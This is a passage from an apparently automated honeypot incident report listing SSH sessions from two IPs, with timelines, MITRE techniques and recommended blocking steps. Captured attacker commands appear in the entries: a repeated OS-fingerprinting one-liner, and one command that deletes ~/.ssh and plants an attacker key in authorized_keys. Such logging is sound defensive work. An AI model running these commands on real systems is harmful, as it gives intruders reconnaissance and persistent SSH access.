| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:25:05` | `cowrie.session.connect` |
| `2026-09-10 19:25:05` | `cowrie.client.version` |
| `2026-09-10 19:25:05` | `cowrie.client.kex` |
| `2026-09-10 19:25:06` | `cowrie.login.success` |
| `2026-09-10 19:25:07` | `cowrie.session.params` |
| `2026-09-10 19:25:07` | `cowrie.command.input` |
| `2026-09-10 19:25:07` | `cowrie.command.input` |
| `2026-09-10 19:25:07` | `cowrie.command.input` |
| `2026-09-10 19:25:07` | `cowrie.command.input` |
| `2026-09-10 19:25:07` | `cowrie.command.input` |
| `2026-09-10 19:25:07` | `cowrie.command.success` |
| `2026-09-10 19:25:07` | `cowrie.command.input` |
| `2026-09-10 19:25:07` | `cowrie.command.input` |
| `2026-09-10 19:25:07` | `cowrie.command.input` |
| `2026-09-10 19:25:07` | `cowrie.command.input` |
| `2026-09-10 19:25:07` | `cowrie.log.closed` |
| `2026-09-10 19:25:09` | `cowrie.session.params` |
| `2026-09-10 19:25:09` | `cowrie.command.input` |
| `2026-09-10 19:25:09` | `cowrie.log.closed` |
| `2026-09-10 19:25:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c4e5dd39c0f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:27 |
| **Last Seen** | 2026-09-10 19:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:27:03` | `cowrie.session.connect` |
| `2026-09-10 19:27:03` | `cowrie.client.version` |
| `2026-09-10 19:27:03` | `cowrie.client.kex` |
| `2026-09-10 19:27:04` | `cowrie.login.success` |
| `2026-09-10 19:27:04` | `cowrie.session.params` |
| `2026-09-10 19:27:04` | `cowrie.command.input` |
| `2026-09-10 19:27:04` | `cowrie.command.input` |
| `2026-09-10 19:27:04` | `cowrie.command.input` |
| `2026-09-10 19:27:04` | `cowrie.command.input` |
| `2026-09-10 19:27:04` | `cowrie.command.input` |
| `2026-09-10 19:27:04` | `cowrie.command.success` |
| `2026-09-10 19:27:04` | `cowrie.command.input` |
| `2026-09-10 19:27:04` | `cowrie.command.input` |
| `2026-09-10 19:27:04` | `cowrie.command.input` |
| `2026-09-10 19:27:05` | `cowrie.command.input` |
| `2026-09-10 19:27:05` | `cowrie.log.closed` |
| `2026-09-10 19:27:06` | `cowrie.session.params` |
| `2026-09-10 19:27:06` | `cowrie.command.input` |
| `2026-09-10 19:27:06` | `cowrie.log.closed` |
| `2026-09-10 19:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b90e4d16221

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:28 |
| **Last Seen** | 2026-09-10 19:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:28:55` | `cowrie.session.connect` |
| `2026-09-10 19:28:55` | `cowrie.client.version` |
| `2026-09-10 19:28:55` | `cowrie.client.kex` |
| `2026-09-10 19:28:56` | `cowrie.login.success` |
| `2026-09-10 19:28:57` | `cowrie.session.params` |
| `2026-09-10 19:28:57` | `cowrie.command.input` |
| `2026-09-10 19:28:57` | `cowrie.command.input` |
| `2026-09-10 19:28:57` | `cowrie.command.input` |
| `2026-09-10 19:28:57` | `cowrie.command.input` |
| `2026-09-10 19:28:57` | `cowrie.command.input` |
| `2026-09-10 19:28:57` | `cowrie.command.success` |
| `2026-09-10 19:28:57` | `cowrie.command.input` |
| `2026-09-10 19:28:57` | `cowrie.command.input` |
| `2026-09-10 19:28:57` | `cowrie.command.input` |
| `2026-09-10 19:28:57` | `cowrie.command.input` |
| `2026-09-10 19:28:57` | `cowrie.log.closed` |
| `2026-09-10 19:28:58` | `cowrie.session.params` |
| `2026-09-10 19:28:58` | `cowrie.command.input` |
| `2026-09-10 19:28:58` | `cowrie.log.closed` |
| `2026-09-10 19:28:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-735444db6cb7

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:30 |
| **Last Seen** | 2026-09-10 19:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:30:52` | `cowrie.session.connect` |
| `2026-09-10 19:30:52` | `cowrie.client.version` |
| `2026-09-10 19:30:52` | `cowrie.client.kex` |
| `2026-09-10 19:30:52` | `cowrie.login.success` |
| `2026-09-10 19:30:53` | `cowrie.session.params` |
| `2026-09-10 19:30:53` | `cowrie.command.input` |
| `2026-09-10 19:30:53` | `cowrie.command.input` |
| `2026-09-10 19:30:53` | `cowrie.command.input` |
| `2026-09-10 19:30:53` | `cowrie.command.input` |
| `2026-09-10 19:30:53` | `cowrie.command.input` |
| `2026-09-10 19:30:53` | `cowrie.command.success` |
| `2026-09-10 19:30:53` | `cowrie.command.input` |
| `2026-09-10 19:30:53` | `cowrie.command.input` |
| `2026-09-10 19:30:53` | `cowrie.command.input` |
| `2026-09-10 19:30:53` | `cowrie.command.input` |
| `2026-09-10 19:30:54` | `cowrie.log.closed` |
| `2026-09-10 19:30:54` | `cowrie.session.params` |
| `2026-09-10 19:30:54` | `cowrie.command.input` |
| `2026-09-10 19:30:54` | `cowrie.log.closed` |
| `2026-09-10 19:30:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4fdf4c36cda

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:32 |
| **Last Seen** | 2026-09-10 19:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:32:54` | `cowrie.session.connect` |
| `2026-09-10 19:32:54` | `cowrie.client.version` |
| `2026-09-10 19:32:54` | `cowrie.client.kex` |
| `2026-09-10 19:32:55` | `cowrie.login.success` |
| `2026-09-10 19:32:56` | `cowrie.session.params` |
| `2026-09-10 19:32:56` | `cowrie.command.input` |
| `2026-09-10 19:32:56` | `cowrie.command.input` |
| `2026-09-10 19:32:56` | `cowrie.command.input` |
| `2026-09-10 19:32:56` | `cowrie.command.input` |
| `2026-09-10 19:32:56` | `cowrie.command.input` |
| `2026-09-10 19:32:56` | `cowrie.command.success` |
| `2026-09-10 19:32:56` | `cowrie.command.input` |
| `2026-09-10 19:32:56` | `cowrie.command.input` |
| `2026-09-10 19:32:56` | `cowrie.command.input` |
| `2026-09-10 19:32:56` | `cowrie.command.input` |
| `2026-09-10 19:32:56` | `cowrie.log.closed` |
| `2026-09-10 19:32:58` | `cowrie.session.params` |
| `2026-09-10 19:32:58` | `cowrie.command.input` |
| `2026-09-10 19:32:58` | `cowrie.log.closed` |
| `2026-09-10 19:32:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84298bde88cf

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:34 |
| **Last Seen** | 2026-09-10 19:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:34:49` | `cowrie.session.connect` |
| `2026-09-10 19:34:50` | `cowrie.client.version` |
| `2026-09-10 19:34:50` | `cowrie.client.kex` |
| `2026-09-10 19:34:50` | `cowrie.login.success` |
| `2026-09-10 19:34:51` | `cowrie.session.params` |
| `2026-09-10 19:34:51` | `cowrie.command.input` |
| `2026-09-10 19:34:51` | `cowrie.command.input` |
| `2026-09-10 19:34:51` | `cowrie.command.input` |
| `2026-09-10 19:34:51` | `cowrie.command.input` |
| `2026-09-10 19:34:51` | `cowrie.command.input` |
| `2026-09-10 19:34:51` | `cowrie.command.success` |
| `2026-09-10 19:34:51` | `cowrie.command.input` |
| `2026-09-10 19:34:51` | `cowrie.command.input` |
| `2026-09-10 19:34:51` | `cowrie.command.input` |
| `2026-09-10 19:34:51` | `cowrie.command.input` |
| `2026-09-10 19:34:51` | `cowrie.log.closed` |
| `2026-09-10 19:34:52` | `cowrie.session.params` |
| `2026-09-10 19:34:52` | `cowrie.command.input` |
| `2026-09-10 19:34:53` | `cowrie.log.closed` |
| `2026-09-10 19:34:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6d2a7942e11

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:36 |
| **Last Seen** | 2026-09-10 19:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:36:57` | `cowrie.session.connect` |
| `2026-09-10 19:36:57` | `cowrie.client.version` |
| `2026-09-10 19:36:57` | `cowrie.client.kex` |
| `2026-09-10 19:36:58` | `cowrie.login.success` |
| `2026-09-10 19:36:59` | `cowrie.session.params` |
| `2026-09-10 19:36:59` | `cowrie.command.input` |
| `2026-09-10 19:36:59` | `cowrie.command.input` |
| `2026-09-10 19:36:59` | `cowrie.command.input` |
| `2026-09-10 19:36:59` | `cowrie.command.input` |
| `2026-09-10 19:36:59` | `cowrie.command.input` |
| `2026-09-10 19:36:59` | `cowrie.command.success` |
| `2026-09-10 19:36:59` | `cowrie.command.input` |
| `2026-09-10 19:36:59` | `cowrie.command.input` |
| `2026-09-10 19:36:59` | `cowrie.command.input` |
| `2026-09-10 19:36:59` | `cowrie.command.input` |
| `2026-09-10 19:36:59` | `cowrie.log.closed` |
| `2026-09-10 19:37:00` | `cowrie.session.params` |
| `2026-09-10 19:37:00` | `cowrie.command.input` |
| `2026-09-10 19:37:00` | `cowrie.log.closed` |
| `2026-09-10 19:37:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94c9ce35d5fd

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:39 |
| **Last Seen** | 2026-09-10 19:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:39:35` | `cowrie.session.connect` |
| `2026-09-10 19:39:35` | `cowrie.client.version` |
| `2026-09-10 19:39:35` | `cowrie.client.kex` |
| `2026-09-10 19:39:36` | `cowrie.login.success` |
| `2026-09-10 19:39:36` | `cowrie.session.params` |
| `2026-09-10 19:39:36` | `cowrie.command.input` |
| `2026-09-10 19:39:36` | `cowrie.command.input` |
| `2026-09-10 19:39:36` | `cowrie.command.input` |
| `2026-09-10 19:39:36` | `cowrie.command.input` |
| `2026-09-10 19:39:36` | `cowrie.command.input` |
| `2026-09-10 19:39:36` | `cowrie.command.success` |
| `2026-09-10 19:39:36` | `cowrie.command.input` |
| `2026-09-10 19:39:36` | `cowrie.command.input` |
| `2026-09-10 19:39:36` | `cowrie.command.input` |
| `2026-09-10 19:39:37` | `cowrie.command.input` |
| `2026-09-10 19:39:37` | `cowrie.log.closed` |
| `2026-09-10 19:39:38` | `cowrie.session.params` |
| `2026-09-10 19:39:38` | `cowrie.command.input` |
| `2026-09-10 19:39:38` | `cowrie.log.closed` |
| `2026-09-10 19:39:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86346dd81d88

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:42 |
| **Last Seen** | 2026-09-10 19:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:42:43` | `cowrie.session.connect` |
| `2026-09-10 19:42:43` | `cowrie.client.version` |
| `2026-09-10 19:42:43` | `cowrie.client.kex` |
| `2026-09-10 19:42:44` | `cowrie.login.success` |
| `2026-09-10 19:42:45` | `cowrie.session.params` |
| `2026-09-10 19:42:45` | `cowrie.command.input` |
| `2026-09-10 19:42:45` | `cowrie.command.input` |
| `2026-09-10 19:42:45` | `cowrie.command.input` |
| `2026-09-10 19:42:45` | `cowrie.command.input` |
| `2026-09-10 19:42:45` | `cowrie.command.input` |
| `2026-09-10 19:42:45` | `cowrie.command.success` |
| `2026-09-10 19:42:45` | `cowrie.command.input` |
| `2026-09-10 19:42:45` | `cowrie.command.input` |
| `2026-09-10 19:42:45` | `cowrie.command.input` |
| `2026-09-10 19:42:45` | `cowrie.command.input` |
| `2026-09-10 19:42:45` | `cowrie.log.closed` |
| `2026-09-10 19:42:46` | `cowrie.session.params` |
| `2026-09-10 19:42:46` | `cowrie.command.input` |
| `2026-09-10 19:42:46` | `cowrie.log.closed` |
| `2026-09-10 19:42:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2191d49a4fe

| Field | Detail |
|---|---|
| **Source IP** | `218.78.128[.]136` |
| **First Seen** | 2026-09-10 19:43 |
| **Last Seen** | 2026-09-10 19:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:43:01` | `cowrie.session.connect` |
| `2026-09-10 19:43:01` | `cowrie.client.version` |
| `2026-09-10 19:43:01` | `cowrie.client.kex` |
| `2026-09-10 19:43:02` | `cowrie.login.success` |
| `2026-09-10 19:43:03` | `cowrie.session.params` |
| `2026-09-10 19:43:03` | `cowrie.command.input` |
| `2026-09-10 19:43:03` | `cowrie.command.failed` |
| `2026-09-10 19:43:03` | `cowrie.log.closed` |
| `2026-09-10 19:43:05` | `cowrie.session.params` |
| `2026-09-10 19:43:05` | `cowrie.command.input` |
| `2026-09-10 19:43:05` | `cowrie.session.file_download` |
| `2026-09-10 19:43:05` | `cowrie.log.closed` |
| `2026-09-10 19:43:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.78.128[.]136` to AbuseIPDB if not already reported
- [ ] Block `218.78.128[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5ac1131b57f

| Field | Detail |
|---|---|
| **Source IP** | `218.78.128[.]136` |
| **First Seen** | 2026-09-10 19:43 |
| **Last Seen** | 2026-09-10 19:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:43:05` | `cowrie.session.connect` |
| `2026-09-10 19:43:05` | `cowrie.client.version` |
| `2026-09-10 19:43:05` | `cowrie.client.kex` |
| `2026-09-10 19:43:06` | `cowrie.login.success` |
| `2026-09-10 19:43:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.78.128[.]136` to AbuseIPDB if not already reported
- [ ] Block `218.78.128[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75fa1b1ecf2a

| Field | Detail |
|---|---|
| **Source IP** | `218.78.128[.]136` |
| **First Seen** | 2026-09-10 19:43 |
| **Last Seen** | 2026-09-10 19:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:43:06` | `cowrie.session.connect` |
| `2026-09-10 19:43:06` | `cowrie.client.version` |
| `2026-09-10 19:43:07` | `cowrie.client.kex` |
| `2026-09-10 19:43:08` | `cowrie.login.success` |
| `2026-09-10 19:43:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.78.128[.]136` to AbuseIPDB if not already reported
- [ ] Block `218.78.128[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a5144a61901

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:44 |
| **Last Seen** | 2026-09-10 19:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:44:49` | `cowrie.session.connect` |
| `2026-09-10 19:44:49` | `cowrie.client.version` |
| `2026-09-10 19:44:50` | `cowrie.client.kex` |
| `2026-09-10 19:44:50` | `cowrie.login.success` |
| `2026-09-10 19:44:51` | `cowrie.session.params` |
| `2026-09-10 19:44:51` | `cowrie.command.input` |
| `2026-09-10 19:44:51` | `cowrie.command.input` |
| `2026-09-10 19:44:51` | `cowrie.command.input` |
| `2026-09-10 19:44:51` | `cowrie.command.input` |
| `2026-09-10 19:44:51` | `cowrie.command.input` |
| `2026-09-10 19:44:51` | `cowrie.command.success` |
| `2026-09-10 19:44:51` | `cowrie.command.input` |
| `2026-09-10 19:44:51` | `cowrie.command.input` |
| `2026-09-10 19:44:51` | `cowrie.command.input` |
